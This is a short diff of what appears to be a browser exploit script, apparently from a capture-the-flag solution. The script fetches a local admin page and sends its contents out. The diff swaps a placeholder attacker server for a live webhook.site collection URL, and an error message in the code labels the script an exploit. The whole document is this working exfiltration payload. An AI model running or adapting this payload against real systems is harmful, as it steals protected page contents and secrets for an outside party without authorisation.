@@ -10,7 +10,7 @@
         fetch("http://localhost:5001/admin")
             .then(res => res.text())
             .then(data => {
-                fetch("https://your-attacker-server.com/log?flag=" + encodeURIComponent(data));
+                fetch("https://webhook.site/03222a6e-526e-4cc2-acb1-9d19805f8604/" + encodeURIComponent(data));
             })
             .catch(err => console.error("Exploit failed", err));
     </script>
